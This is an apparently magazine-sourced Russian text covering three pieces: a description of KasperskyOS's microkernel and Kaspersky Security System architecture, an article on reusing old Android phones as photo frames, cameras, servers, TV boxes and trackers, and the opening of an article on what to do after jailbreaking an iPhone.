защищенных ОС, то делать это с нуля, рассматривая проблемы безопасности
в качестве основополагающих требований и учитывая их влияние на всех этапах
проектирования системы. Именно поэтому главный российский борец с виру-
сами и замахнулся на разработку собственной операционной системы. Но, по-
нимая всю сложность создания новой системы общего назначения вроде
Windows или UNIX, решил начать со специфической. Удачно выбрана и об-
ласть — промышленные информационные системы до сих пор не были избало-
ваны надежной защитой. С одной стороны, это важное дело, с другой — воз-
можность  получить  бесценный  опыт,  который,  глядишь,  можно  будет
распространить и на другие области применения операционных систем.
   Решиться на разработку собственной ОС, в которой механизмы безопас-
ности станут фундаментом, можно, только основательно изучив, что же вооб-
ще в этой области наработано. Команда KasperskyOS так и поступила. В пер-
вую очередь взгляд был брошен на материалы «Радужной серии» (Rainbow
Series) — набора стандартов информационной безопасности, разноцветные
тома которых были изначально опубликова-
ны в Министерстве обороны США, а затем
в Центре национальной компьютерной без-
опасности США.
   Стандарты эти охватывают самые раз-
ные аспекты информационной безопасно-
сти, от терминологического базиса до руко-
водств пользователей и сотрудников службы
безопасности. Важнейшая часть «Радужной
серии» — это «Оранжевая книга», где зада-
ются критерии определения безопасности
компьютерных систем. Ее ратифицирован-
ным в международном масштабе аналогом
является стандарт ISO/IEC 15408.
   Главный постулат «Оранжевой книги» за-
ключается в том, что безопасность компью-
терных систем никогда не была и никогда
                                             «Оранжевая книга» — одинне будет идеальной. Любая эксплуатируемая
                                                из многочисленных томов
или вновь проектируемая система безопас-                                            «Радужной серии», посвящен-
на ровно настолько, насколько мы доверяем  ной кибербезопасности
ей решение этого важного вопроса. А значит, правильнее говорить не о безо-
пасных, а о доверенных системах.
  Именно поэтому совокупность механизмов, которые в информационной
системе реализуют ту или иную политику безопасности и определяют степень
доверия к этой системе, в «Оранжевой книге» именуют ДВБ — доверенная вы-
числительная база (Trusted Computer Base).
   Какую функцию в информационной системе выполняет ДВБ? Единственно
верную: контролирует любые взаимодействия компонентов информационной
системы между собой, с системными функциями и аппаратной базой систе-
мы. Ни одно обращение любого компонента системы не должно остаться
без пристальной проверки ДВБ с точки зрения поддерживаемого ею механиз-
ма (или механизмов) безопасности. В «Оранжевой книге» эту функцию ДВБ
именуют мониторингом обращений.

Контроль, контроль и еще раз
контроль! Вот основная
функция доверенной
вычислительной
базы
                                                        INFO

                                                                    Среди томов «Радуж-
                                                                         ной серии», кроме
                                                                       «Оранжевой книги»,
                                                                                 есть еще и «Ярко-о-
                                                                          ранжевая книга».
                                                              В ней описываются
                                                                        подходы к органи-
                                                                         зации тестирования
                                                                            безопасности в до-
                                                                         веренных системах.
                                                              В настоящее время
                                                                               эти подходы исполь-
                                                                           зуются как разработ-
                                                                         чиками доверенных
                                                                              систем, так и серти-
                                                                 фицирующими эти
                                                                        системы органами.


   Мониторинг обращений фактически означает, что компоненты информа-
ционной системы напрямую ни между собой, ни с ядром системы, ни с аппа-
ратурой не взаимодействуют. Все происходит по указанию ДВБ. Разрешила
ДВБ — вперед! Запретила — взаимодействию не быть. Выходит, ДВБ — это та-
кая штука, которая позволяет изолировать друг от друга компоненты информа-
ционной системы. Старый как мир принцип властвования — через разделение.
   «Доверенная» в аббревиатуре ДВБ означает, что мы вынуждены доверять
ей. А сделать это проще, если ДВБ прозрачна как с точки зрения своей органи-
зации, так и с точки зрения способов проверки правильности ее работы. До-
биться такой прозрачности можно разными способами. Самые действенные
из них — это простота и компактность организации ДВБ, а также возможность
использовать для ее проверки некоторый набор формальных методов. Он по-
зволит дать однозначный ответ о том, насколько ДВБ (ну и информационная
система на ее основе) соответствует своему предназначению (это называется
«валидация») и насколько полно принципы, заложенные в основу при проекти-
ровании, были воплощены на этапах разработки (верификация).
   Теперь-то и становится ясно, что команда проекта KasperskyOS занялась
созданием собственного варианта этой самой ДВБ. Ну, почти собственно-
го. Идеологическим предком ДВБ «Лаборатории Касперского» стал проект
FLASK (Flux Advanced Security Kernel) — архитектурное решение подсистемы
безопасности в ОС, которое позволяет гибко внедрять и настраивать полити-
ки безопасности под конкретное применение.
  К слову сказать, FLASK — это предок не только KasperskyOS, но и таких ре-
ализаций подсистем безопасности, как SELinux и TrustedBSD. Модель систе-
мы безопасности на основе модулей LSM, которую используют в современных
проектах на основе GNU/Linux, — это тоже вариация на тему FLASK. Вот толь-
ко в системах на Linux и BSD такой монитор обращений — это все же внешний
довесок. В проекте же KasperskyOS — это основа системы.

ВЕРИФИЦИРУЙ ЭТО. КОМПОНЕНТНАЯ МОДЕЛЬ И IPC-ПИСЬМА
Давай подробнее глянем на архитектуру KasperskyOS. С точки зрения обще-
принятой классификации архитектурных решений KasperskyOS — система
микроядерная. И ее микроядро — действительно «микро»! Не более тысячи
строк кода. В них втиснуты диспетчер процессов, механизм межпроцессного
взаимодействия (IPC — inter-process communication) и та самая ДВБ, которая
именуется KSS (Kaspersky Security System) и пристально следит за механиз-
мом IPC.
  И это все?! А как же управление памятью, периферийными устройствами?
Как же драйверы файловых систем? В KasperskyOS все это — архитектур-
ные излишества. Зачем, к примеру, содержать на балансе громоздкий дис-
петчер памяти, если в промышленной системе память процессам выделяется
статически на этапе их создания, а механизм shared memory с точки зрения
межпроцессного взаимодействия — это зло? Никаких общих адресов, хочешь
общаться — пиши корректно составленное IPC-сообщение, которое будет пе-
рехвачено и перлюстрировано KSS.
   Таким образом, базовый принцип KasperskyOS схож с общим подхо-
дом любых микроядерных систем. Процессы взаимодействуют между собой
и с функциями ядра системы, отправляя и получая IPC-сообщения. Микроя-
дро предоставляет им эту возможность с помощью механизма IPC. В случае
KasperskyOS за этим механизмом следит KSS, которая для каждого IPC-сооб-
щения выносит вердикт «можно» (allow) или «нельзя» (deny). При этом по умол-
чанию KSS реализует принцип default deny. То есть если программа по какой-то
причине не реализует такую модель взаимодействия, то ни отправить, ни по-
лучить IPC-сообщения она не сможет. И останется в полной изоляции. Печаль-
ка для вирусов, малвари и криворуко написанного софта.





Как и любая микроядерная ОС, KasperskyOS предоставляет процессам механизм обмена со-
общениями. И непрерывно контролирует его с помощью Kaspersky Security System

Ладно, а как же должен выглядеть правильно написанный софт для KasperskyOS?
Для софтописателей разработчики KasperskyOS предлагают специальный
подход, который именуется «компонентная модель». Фактически эта модель
служит для прикладных программистов удобной абстракцией, позволяющей
создать корректное с точки зрения KasperskyOS приложение. Кроме того,
поддержка компонентной модели обеспечивается инфраструктурно — набо-
ром средств разработки.
  В основе компонентной модели программы лежит понятие «сущность»
(Entity). Сущностью может быть отдельная программа, предоставляющая (сер-
вер) или потребляющая (клиент) функции для других сущностей. Или же ей мо-
жет быть реализация какой-то отдельной функции программы. В общем слу-
чае сущность — это набор компонентов, каждый из которых включает в себя
одну или более внутрикомпонентную сущность. В самом вырожденном случае
компонентной модели сущность — это один компонент с одной внутрикомпо-
нентной сущностью. Именно сущности, реализуя свои функции, общаются
друг с другом с помощью IPC-сообщений. То есть выполнение сложно устро-
енной программы или клиент-серверного сервиса, созданных по идеологии
компонентной модели, — это IPC-переписка сущностей, за которой и следит
KSS. Чтобы сущность могла участвовать в таком диалоге, в ее составе наряду
с базовым кодом должен присутствовать код интерфейса доступа к механиз-
му IPC микроядра.
  И вот тут начинается самое интересное. Создание кода этого интерфейса
возлагается не на разработчика программы. Код интерфейса автоматически
генерируется из его описания на языке IDL (Interface Definition Language) — С++
подобного языка спецификации интерфейсов в распределенных системах. Что
дает использование IDL? Возможность той самой верификации корректности
взаимодействия одной сущности с другой сущностью. Строгая типизация IDL
этому способствует и позволяет специально разработанному компилятору Nk
перед автогенерацией кода интерфейса проверить его на безошибочность
с точки зрения компонентной модели. Исходник интерфейса на IDL после
компиляции Nk преобразуется в объектный код в необ-
ходимой разработчику нотации. Конечно же, поддер-
живаются С и С++, а также язык функционального про-
граммирования Haskell.
  Помещенный в код сущности объектный код интер-
фейса обеспечивает формирование функций Proxy (в
клиентских приложениях) и Dispatch (в серверных при-         INFO
ложениях). Почему они важны с точки зрения архитекту-                                                                      Вариация деклара-
ры KasperskyOS? Клиентское приложение, вызывая ту      тивного языка IDL есть
или иную функцию серверного приложения или ядра си-     и у компании Microsoft.
                                                                  Она именуется MIDLстемы, передает ее параметры интерфейсной функции                                                                                      (Microsoft IDL) и пред-
Proxy, которая сериализует их (упаковывает в формат                                                                              лагается разработчи-
IPC-сообщения), а затем вызывает транспортную функ-     кам клиент-серверных
цию механизма IPC в микроядре и передает ей создан-      приложений, которые
                                                                      функционируют в рас-
ное IPC-сообщение. Теперь Proxy-функции остается                                                                      пределенных гетероген-
только ждать ответного IPC-сообщения с результатом,     ных системах, например
чтобы десериализовать его и передать сделавшему      Windows, UNIX и OS X.
                                                                      Задачи MIDL совпадаютвызов базовому коду клиента.                                                                          с задачами варианта IDL
   Функция Dispatch на серверной стороне делает об-     «Лаборатории Каспер-
ратное: получив IPC-сообщение, она десериализует       ского»: описание ин-
                                                                      терфейсов клиент-сер-его (распаковывает параметры для вызываемой функ-
                                                                        верных приложений
ции), передает их базовому коду связанного с данным                                                                     при выполнении удален-
интерфейсом сервиса и, получив от него результат, се-      ного вызова процедур.
риализует его в IPC-сообщение.
  Но что делать, если сущность (например, сервер какого-либо сервиса) со-
держит множество компонентов, а из них каждый состоит из разных функций,
к которым может обращаться сущность-клиент? Ведь по идеологии компо-
нентной модели с каждой такой функцией должен быть связан собственный
Dispatch-интерфейс. Как механизм IPC определит, которому из них передавать
IPC-сообщение? И снова на помощь программисту приходят языки специфи-
каций. При упаковке нескольких функций с их Dispatch-интерфейсами в один
компонент программист описывает его на языке CDL (Component Definition
Language). Компилятор Nk на основе CDL-описания компонента генерирует
его код с единым в рамках компонента интерфейсом, который на самом деле
является совокупностью Dispatch-интерфейсов всех функций, входящих в со-
став компонента.





Код интерфейсов для связи сущностей и их объединения в компоненты
автоматически генерируется на основе языков IDL, CDL и EDL

Для многокомпонентной сущности есть свой язык спецификаций EDL (Entity
Definition Language). На нем описываются все компоненты, которые входят в со-
став сущности, а также (если таковые имеются) отдельные функции с собствен-
ными Dispatch-интерфейсами. В результате компиляции EDL-файла формирует-
ся общий код сущности с единым глобальным Dispatch-интерфейсом, который,
по сути, является точкой входа IPC-сообщения в сущность. Найти же адресата
для него — конкретный Dispatch-интерфейс конкретной функции (отдельной или
в составе компонента) — можно по его уникальному идентификатору Runtime
Interface ID (RIID). Он генерируется на этапе компиляции EDL-описания сущно-
сти. Такая вложенность строго типизированных спецификаций позволяет раз-
работчику создать сколь угодно сложную программу, каждая функция которой
будет снабжена собственным Proxy- или Dispatch-интерфейсом.





Пример описания гипотетической сущности Foo на декларативном языке EDL

Выше было сказано, что выполнение программы, разработанной по идеоло-
гии компонентной модели, является диалогом функций, то есть их перепиской
IPC-сообщениями строго определенного формата. Важно, что это именно ди-
алог, а не какофония, поскольку IPC-взаимодействие — дело двух сущностей,
что-то вроде peer-to-peer. Однако, в отличие, например, от пиринговых протоко-
лов, IPC-взаимодействие в KasperskyOS осуществляется по принципу рандеву.
   Посредником, конечно же, выступает механизм IPC микроядра. А чтобы
рандеву состоялось, то есть был настроен канал обмена IPC-сообщениями
между конкретными сущностями, канал этот создается механизмом IPC путем
выделения сущностям специальных глобальных системных объектов хендлов
(handle) — указателей, которые идентифицируют сущности отправителя и по-
лучателя. На время взаимодействия сущности становятся владельцами своих
хендлов, что и дает им право использовать открывающийся IPC-канал.
Хотя канал IPC-взаимодействия связывает две сущности между собой, каждая из них инфор-
мирована о нем только наполовину. Точка их рандеву — механизм IPC в микроядре

При такой организации IPC-взаимодействия каждая сущность имеет пред-
ставление только о выделенном ей хендле. О паре хендлов отправителя и по-
лучателя знает только механизм IPC. Потому-то процедура формирования
IPC-канала обмена сообщениями и именуется «спариванием хендлов» (handles
pairing). После такого спаривания вклиниться в диалог сущностей не может ни-
кто посторонний. IPC-канал будет существовать до тех пор, пока взаимодей-
ствующие сущности будут оставаться владельцами спаренных хендлов.
Модель IPC-взаимодействия на основе спаренных хендлов
запатентована «Лабораторией Касперского»
Вклиниться в диалог, который ведется по IPC-каналу, нельзя, но вот просма-
тривать бегущие в нем IPC-сообщения можно. Не кому попало, конечно, а KSS,
поскольку она тесно интегрирована с механизмом IPC.
  Важнейшей задачей Proxy- и Dispatch-интерфейсов сущностей является
создание корректных IPC-сообщений путем строго определенной сериали-
зации входных параметров для вызываемых функций и результатов их выпол-
нения. Теперь становится понятно, почему сгенерированный на основе IDL-о-
писания код интерфейсов (Proxy и Dispatch) в сущностях так важен. Именно
он — гарантия того, что KSS в микроядре, перехватив IPC-сообщение, тоже
сможет десериализовать его, извлечь параметры вызова функции сервера или
результат ее выполнения, нужный клиенту, и проверить на валидность с точки
зрения используемой модели безопасности.
   Положительный вердикт KSS — сигнал механизму IPC передать IPC-сооб-
щение адресату. Отрицательный вердикт приведет к задержанию и уничтоже-
нию послания. Это метод, известный со времен царской охранки с ее перлю-
страцией всей почтовой переписки. Простой, но действенный!

KASPERSKY SECURITY SYSTEM.
ПЕРЛЮСТРАТОР И СУДЬЯ В ОДНОМ ФЛАКОНЕ
Разобравшись с тем, как устроены программы, которые выполняются под
управлением KasperskyOS, можно взглянуть и на самого «перлюстратора» —
подсистему KSS.
   Состоит Kaspersky Security System из трех частей: моду-
ля Security Runtime, интегрированного с механизмом IPC,
модуля Security Server, который принимает решение о вер-
дикте в соответствии с той или иной политикой безопас-
ности, и структуры Decision Cache, которая хранит вердик-
ты по отдельным политикам безопасности для повышения
производительности перлюстрации IPC-сообщений.                                                        INFO
   Функции каждого из этих модулей в составе KSS вполне
предсказуемы. Security Runtime сидит на перехвате и де-       За использование
                                                                         темпоральных логик
сериализации IPC-сообщений, пролетающих туда-сюда                                                                              в качестве средства
по многочисленным IPC-каналам взаимодействующих       формальной вери-
пар сущностей. Извлеченные при десериализации па-      фикации программ
                                                                        и систем следуетраметры функций или результаты их выполнения Security                                                                             благодарить ученого
Runtime передает в Security Server. Последний представ-        Амира Пнуели.
ляет собой набор политик безопасности, специфичных      В 1996 году за эту
                                                                              работу он получилдля поддерживаемой системы.
                                                                     престижнейшую пре-
   Например, для офисной ИС с такими сетевыми сервиса-                                                              мию Тьюринга.
ми, как почта, веб, базы данных и файловый обмен, Security
Server может иметь реализации дискреционной, мандат-
ной и ролевой политик безопасности. Тогда к каждой из них будет привязан со-
ответствующий политике контекст безопасности. В случае же системы, управля-
ющей технологическим процессом (например, роботизированным станком или
механизмами авионики самолета), политика безопасности будет определять ле-
гитимную для этого технологического процесса последовательность функций,
не приводящую к его краху или необычным результатам. Описание политик без-
опасности для подобных случаев выполняется с помощью удобного для валида-
ции формального аппарата, например в терминах темпоральных логик.





Организация Security Server позволяет реализовывать те политики безопасности,
потребность в которых имеется у защищаемой информационной системы





Если бы функции калькулятора были критически важными
с точки зрения безопасности, то его конфигурация CFG выглядела бы так
Но каким образом Security Server, который способен поддерживать множе-
ство политик безопасности, определяет, какую из них применить для валида-
ции того или иного IPC-сообщения? Чтобы связать конкретные действия сущ-
ностей с конкретными политиками безопасности, командой KasperskyOS был
разработан декларативный язык конфигураций безопасности CFG.





Действия контроллера, который управляет дрелью, и самой дрели можно согласовать,
используя формализм линейной темпоральной логики. И создать на его основе
спецификацию свойств безопасности





Связанная с каждой сущностью структура Security Gate автоматически генерируется
на основе конфигурации безопасности CFG и IDL-описания сущности
CFG позволяет указать, какую из политик, реализованных в Security Server,
применять для вынесения вердикта по действиям конкретной сущности.
Конфигурация безопасности, описанная на языке CFG, а также IDL-описа-
ние интерфейса сущности позволяют компилятору Nk сгенерировать свя-
занную с сущностью структуру Gate, уникально идентифицированную SID’ом
(Security ID). Она привязывает действия сущности (ее автономного выполне-
ния без IPC-взаимодействия, IPC-взаимодействие с другими сущностями или
прямой запрос к KSS) с конкретной политикой безопасности. Такой маппинг
обеспечивает Security Server точным указанием того, какую политику приме-
нять для вынесения вердикта в каждом конкретном случае. Отсутствие струк-
туры Gate у сущности делает ее изгоем KasperskyOS. По умолчанию KSS к ней
применяет политику default deny.

ОТ ДЕМОНСТРАЦИОННЫХ СТЕНДОВ К АВИАЛАЙНЕРАМ.
ПЕРВЫЕ ШАГИ В РЕАЛЬНЫЙ МИР
Безусловно, выше дано только самое общее представление принципов ор-
ганизации KasperskyOS. Микроядерная архитектура, основанная на обмене
IPC-сообщениями, компонентная модель приложений, выполняющихся под
управлением KasperskyOS, IPC-канал на основе спаренных хендлов и, глав-
ное, полностью формально верифицируемый код интерфейсов, компонен-
тов и сущностей, который автоматически создается на основе спецификаций
на языках IDL, CDL и EDL.





На этой модели технологической линии со сверлильным станком разработчики KasperskyOS
демонстрируют возможности своего решения на выставках и конференциях
   Ну и наконец, KSS — та
самая  доверенная  вычис-
лительная база — монитор
обращений,    скрупулезно
проверяющий все действия
приложений на соответствие
политикам    безопасности,
с которыми они связаны. Ее
ядро,  Security  Server, полу-
чает точные указания о том,
какую из них использовать
в конкретном случае на осно-
ве языка описания конфигу-
раций CFG. Все это лишь вер-
хушка айсберга KasperskyOS.
   Представляя  свое  тво-
                                Вот так представляется интеграция OEM-решения KSSрение, разработчики на фо-
                                в информационную систему с тремя разными
румах по информационной                                   с точки зрения безопасности доменами
безопасности и  выставках
демонстрируют  возможно-
сти системы, используя стенд с макетом технологической линии — сверлиль-
ным станком с ЧПУ.





Гипервизор PikeOS фирмы SYSGO — первый пример коммерческого
применения Kaspersky Security System
   Активное общение с потенциальными партнерами вскоре привело разра-
ботчиков KasperskyOS к мысли о том, что не всегда существует суровая необ-
ходимость в замене ОС. Ведь такая замена неизбежно сопряжена с полной
перестройкой прикладной инфраструктуры в соответствии с идеологией ком-
понентной модели.
  Именно поэтому на нынешней стадии развития проект KasperskyOS — это
портфельное OEM-решение. В некоторых случаях достаточно интегрировать
KSS с уже существующей ОС. Именно так у «Лаборатории Касперского» воз-
никло стратегическое партнерство с компанией SYSGO — разработчиком
гипервизора на базе микроядерной ОС реального времени PikeOS, которая
применяется во встраиваемых решениях, в частности для управления модуль-
ной системой авионики гражданских лайнеров Airbus A350 и военных Airbus
A400M. Интеграция Security Runtime KSS с микроядром PikeOS обеспечивает
реализацию возможностей доверенной вычислительной базы, аналогичной
KasperskyOS, при минимальных затратах на модификацию прикладных про-
грамм.
Опыт сотрудничества с SYSGO показал, что система безопасности KSS может
успешно применяться в качестве отдельного встраиваемого OEM-решения.
Ее несложно интегрировать в существующие информационные инфраструк-
туры, которые нуждаются в повышенной безопасности.
  Команда KasperskyOS продолжает совершенствовать свое детище, нара-
щивая возможности системы. Добавляется поддержка разных процессорных
архитектур, файловых систем и периферийных устройств. Проводятся экспе-
рименты с реализациями новых политик безопасности. Более того, на базе
проекта KasperskyOS ведется активная разработка собственного доверенно-
го гипервизора.
  И кто знает, возможно, через пару-тройку лет о его особенностях можно
будет рассказать так же, как сейчас о KasperskyOS.


       WWW

              Официальная промостраница Kaspersky Security System:
                 http://media.kaspersky.com/pdf/Kaspersky_Lab_whitepaper_Kaspersky_Security_System.pdf

              Интервью Х с А. П. Духваловым о перспективах проекта «11.11»

               «Оранжевая книга»: http://csrc.nist.gov/publications/history/dod85.pdf

                Статья системного аналитика «Лаборатории Касперского» Екатерины Рудиной о валидации
              и верификации

               Патент ЛК на решения Kaspersky Security System
MOBILE
ДОРОГУ
СТАРИКАМ





  Денис Погребной
  denis2371@gmail.com

ВОСЕМЬ
СПОСОБОВ
ИСПОЛЬЗОВАТЬ
СТАРЫЙ
СМАРТФОН
НА ANDROID
Любой высокотехнологичный гаджет со временем устаре-
вает. Конечно, можно его продать и купить новый, но сто-
ит ли оно того? При нынешнем техническом прогрессе
старый смартфон или планшет бывает трудно продать
даже за двадцать долларов. Вместо этого можно найти
старичку полезное применение, заменив им другие вещи,
да еще и сэкономить кучу денег. О том, как это сделать, я
и расскажу.

УМНАЯ ФОТОРАМКА
Если старый планшет валяется без дела, то почему бы не поставить его на тум-
бочку и не настроить показ фотографий? Как минимум можно включить слайд-
шоу из галереи. Но лучше установить специальное приложение. Оно и фото
из сторонних источников (500px) покажет, и время, и погоду, и еще кучу всего.
  В качестве примера хороших приложений данного класса можно привести
Social Frame HD или Senior Frame. Ночью можно запускать ClockPlus DayDream
или часы со стрелками, и получится умный ночник.
   Естественно, гашение экрана нужно отключить: «Настройки -> Дисплей ->
Спящий режим -> Никогда».





Senior Frame и фоточки из 500px
ВИДЕОНАБЛЮДЕНИЕ
Еще один вариант — домашняя система видео-
наблюдения. Здесь у нас есть два решения: Silent
Eye с автоматическим обнаружением движения
и последующей отправкой фото по ММС или
электронной почте либо IP Webcam, позволяю-
щая получать видеопоток в режиме реального
времени через веб-сайт.
  Первое решение хорошо тем, что позволяет,
что называется, установить и забыть. Если кто-
то проникнет в дом — тебе придет сообщение
и фотка злоумышленника (если повезет). Плюс
такая программа способна проработать около
десяти часов от одного заряда аккумулятора.
Второй вариант подойдет тем, кому нужно всегда
следить за происходящим, однако в этом случае
нужно иметь в виду, что поток также будет досту-
пен для просмотра и разработчикам приложе-
ния/веб-сервиса.
                                                   Настраиваем IP Webcam
WI-FI-РЕПИТЕР
Старый смартфон можно использовать в каче-
стве Wi-Fi-репитера (точки доступа, раздающей
интернет через другую точку доступа), позво-
ляющего увеличить радиус действия сети Wi-Fi.
Чтобы сделать это, можно использовать прило-
жение fqrouter2, изначально созданное для об-
хода Великого китайского файрвола, но позднее
обросшее множеством функций. Создать репи-
тер с его помощью достаточно просто:
1. Устанавливаем программу с сайта разработ-
   чика (из Google Play прогу удалили по причине
   ее «подозрительной» деятельности в системе).
2. Сразу после запуска и предоставления прав
   root смахиваем экран влево, листаем до Wifi
   Repeater и нажимаем Config. Указываем имя
   точки доступа и пароль, сохраняем настройки.
3. Нажимаем на переключатель OFF.
4. Если точка доступа не заработала, возвраща-
   емся в настройки, нажимаем кнопку Disable
    Wifi P2P и вновь пробуем включить.             Настраиваем Wi-Fi-репитер
Репитер требует Android 4.0+ и работает далеко
не на всех смартфонах и планшетах. Точно под-
держиваются:
•  Nexus 4/5;
•  Samsung Galaxy S2/3;
•  LG G2;
• HTC One M8/X;
•  Motorola Defy;
•  Motorola Razr M.

СЕТЕВОЕ ХРАНИЛИЩЕ
Древний смартфон или планшет можно превра-
тить в файловый сервер. Доступ можно организо-
вать как к содержимому SD-карты, так и к файлам
на флешке или даже жестком диске, подключен-
ном к девайсу с помощью OTG-кабеля. Скорость
будет не ахти какая, но порой она и не требуется.
   Организация  файлового  сервера  Samba
на примере Samba Server:
1. Устанавливаем и запускаем программу Samba  Настраиваем Samba Server
   Server.
2. Нажимаем вверху на плюс и выбираем SMB
   Server.
3. Настраиваем порты и имя точки.
4. Переходим на вкладку Roots и через кнопку
   Add добавляем расшариваемые папки. Не за-
  бываем вводить имя каждой из них.
5. Нажимаем кнопку «Назад», соглашаемся с со-
   хранением изменений, потом еще раз «На-
   зад» и ОK.
6. Нажимаем Start и ОK.

IP-адрес можно узнать по кнопке Info, а MAC —
в настройках самого смартфона.
   Также можно  настроить  раздачу  файлов
по FTP. Для этого воспользуйся приложением
FTPServer. Настроить его очень просто.

ПУЛЬТ УПРАВЛЕНИЯ
Из старого смартфона получится отличный пульт
управления компьютером или джойстик. Доста-   Пульт Tablet Remote
точно только установить специальную программу. Одни из самых интересных:
•  Monect PC Remote — подключить можно с помощью USB-кабеля, Bluetooth
   или через Wi-Fi. В программе есть клавиатура, возможность управлять кур-
  сором мыши, удобный пульт управления браузером. Главное — это несколь-
   ко видов джойстиков (для шутеров, автосимуляторов, авиасимуляторов
   и обычный геймпад). Работает на Android 4.0.3+. Еще в приложении имеет-
   ся поддержка датчиков положения в пространстве для управления в гонках
   и авиасимуляторах и даже для прицеливания в шутерах. Единственный ми-
   нус: реагирует устройство на поворот в пространстве слишком долго.
•  Max Remote — хорошее приложение. Отличается приятным дизайном
   без излишеств, множеством мультимедиафункций, удобством и огромным
   количеством разнообразных джойстиков. Переведено на русский язык.
•  Tablet Remote — отличный мультимедиапульт. Работает на Android версии
    2.1+. Позволяет управлять одним устройством Android с другого. Для на-
   стройки программы необходимо подключить устройства друг к другу.
  На управляемом устройстве: Connection -> Scan Devices -> Make Device
   Discoverable. На управляющем устройстве: Setup -> Enable Tablet Remote
   и Change The Input method For Tablet Remote. Теперь осталось только нажать
   Remote.

SMART TV
Старый смарт или планшет — это еще и очень хо-
роший медиапроигрыватель, который можно под-
ключить к телевизору или монитору и превратить
в ТВ-приставку/плеер. От смартфона/планшета
понадобится поддержка HDMI (можно и через
MHL или DisplayPort) и более-менее нормальный
процессор для просмотра видео в HD или Full HD
качестве. Еще рекомендую приобрести Bluetooth
клавиатуру и мышь. Если собираешься играть, то
вполне можно приобрести джойстик.
   Сразу скажу, что в такого типа конфигурации
есть две проблемы. Во-первых, экран подклю-
ченного устройства всегда будет гореть и дубли-
ровать изображение на телевизоре. Придется
либо смириться, либо получить root и установить
приложение Screen Standby. Во-вторых, выдава-
емое на экран ТВ изображение будет иметь раз-
решение экрана самого смартфона. И если боле-
е-менее современный смартфон с разрешением
экрана 1280 x 720 не создаст никаких проблем,   Screen Standby с интерфейсом
                                                     в стиле Metro
то с древними моделями с разрешениями типа 840 x 480 на изображение смо-
треть будет невозможно.
   Как бы там ни было, есть масса приложений, отлично подходящих для Smart
TV на базе Android. На большом экране будет удобнее пользоваться специа-
лизированным лаунчером. Можно поставить Handy Smart TV Launcher, Top TV
Launcher, Simple TV Launcher или любой другой из маркета.
   Понадобится хороший медиаплеер. Главное требование — скорость и под-
держка наибольшего числа форматов. Явные лидеры:
•  VLC. Поддержка огромного количества форматов, полное отсутствие ре-
  кламы и, конечно, открытый исходный код. Правда, функциональность чуть
   хуже, чем у конкурентов.
• MX Player. Один из лучших плееров по функциональности. Не забываем ста-
   вить кодеки.
•  KMPlayer.

В качестве пульта дистанционного управления очень хорошо подойдет опи-
санный выше Tablet Remote.
   Браузер годится любой. Если нужна поддержка Flash, то стоит попробовать
FlashFox. Конечно, Flash работает не очень хорошо, но хотя бы работает. А если
у тебя на девайсе Android ниже 4.4 и установлен Flash-плеер, то обязательно
попробуй браузеры Dolphin с дополнением Jetpack, UC Browser.
  На самопальную приставку можно стримить
игры через видеокарту NVIDIA. Для этого нуж-
но установить Moonlight Game Streaming. Про-
ект еще немного сыроват, но по возможностям
не уступает стандартному стриминговому сер-
вису от NVIDIA.
  Для просмотра онлайн-ТВ хорошо подой-
дут: SPB TV, ViNTERA.TV, Torrent Stream Controller,
PeersTV, Бизон ТВ, Crystal TV+ и другие. Для про-
смотра онлайн-кино из интернет-кинозалов: ivi.
ru, MEGOGO, NOW.ru.
  В довесок можно установить одно из прило-
жений для просмотра телепрограммы. Самые ин-
тересные, на мой взгляд: Телепрограмма, ВсёТВ,
TV Control, TV-гид. И КиноПоиск — искать инфор-
мацию о нужном фильме.

ФИТНЕС-ТРЕКЕР
У старых моделей смартфонов есть ключевое                                                   Экран CycldeDroid
преимущество над новыми — они меньше и лег-  во время заезда
че, разбить или потерять их не так жалко. Поэтому для трекинга бега и других
активных видов спорта они подходят наилучшим образом. Если ты много вре-
мени проводишь на велосипеде, то старый смартфон можно превратить в не-
плохой велокомпьютер.
  Для этого нужно всего лишь приобрести специальное крепление, а также
установить приложение, например BikeComputer или CycleDroid. Для бегунов
тоже есть много интересного: Runtastic Бег и фитнес, Шагомер.
   Обрати внимание, многие из них работают даже в Android 2.3, поэтому по-
дойдет и самый древний смарт.

GPS-ТРЕКЕР
Я думаю, многие слышали про Android Device Manager и историю местополо-
жений от Google. Так вот, с их помощью старый смартфон можно использовать
как устройство, отслеживающее местоположение любого объекта, в том чис-
ле автомобиля. Особенно актуально это при угоне. В данном случае смарт-
фон устанавливается в скрытом месте (под обшивкой) с возможностью заря-
дить либо подключить дополнительно автономное питание, которого должно
хватить на несколько суток. А ведь можно еще и антивор на смарт установить,
который способен прослушивать и записывать разговоры...

USB-флешка

Смартфон можно превратить в USB-флешку.
Для этого потребуется приложение DriveDroid.
Оно позволяет эмулировать подключенную
к компьютеру флешку, на которую записан
ISO- или IMG-образ диска. В режиме эмуляции
флешки работают только образы с гибридным
загрузчиком. А на некоторых устройствах уже
тестируется эмуляция внешнего USB-дисковода
с диском, позволяющая запустить абсолютно
любой образ. Приложение требует Android 2.2+
и права root.
  Перед использованием приложение необ-
ходимо настроить. Оно должно знать, с каким
смартфоном имеет дело, есть ли на нем права
root и все ли драйверы работают нормально. Поэ-
тому сразу после запуска подключаем смартфон
к компу, нажимаем Setup, а далее просто сле-  Список ОС, доступных
                                                     в репозитории DriveDroid
дуем инструкциям. На последнем этапе DriveDroid попросит выбрать способ
создания флешки: Standard Android или другой. После этого он сделает по-
пытку активировать флешку, если она видна на компе — все нормально, если
нет — пробуем другой способ.
  А далее можно начинать пользоваться. Множество дистрибутивов Linux
и других систем DriveDroid может скачать сам из своего репозитория, для это-
го достаточно нажать кнопку «Плюс» и выбрать Download image. На экране по-
явится список ОС. Выбираем нужную, и ее образ будет автоматически скачан.
Далее останется только выбрать его на главном экране приложения и подклю-
чить смартфон к компу.


ВЫВОДЫ
Думаю, в этой статье достаточно способов использования старого смарт-
фона или планшета, потому что такому функциональному гаджету просто
нельзя пылиться на полке. Чтобы найти ему применение, надо всего лишь
немного подумать.
MOBILE
ДЖЕЙЛБРЕЙК
ДЛЯ ВСЕХ
И КАЖДОГО





                                                                       Михаил Филоненко
                                                                                             mfilonen2@gmail.com

                           ЧТО ДЕЛАТЬ ПОСЛЕ
                             ТОГО, КАК ВЫПОЛНЕН
                       ВЗЛОМ УСТРОЙСТВА
Итак, ты решился сделать джейлбрейк, скачал нуж-
ную утилиту с сайта paungu или taig, подключил смарт-
фон к компу и запустил приложение. После несколь-
ких перезагрузок на экране высветилось сообщение
об успешном джейлбрейке, а на смартфоне появилось
приложение Cydia. Вроде бы все OK, но что делать
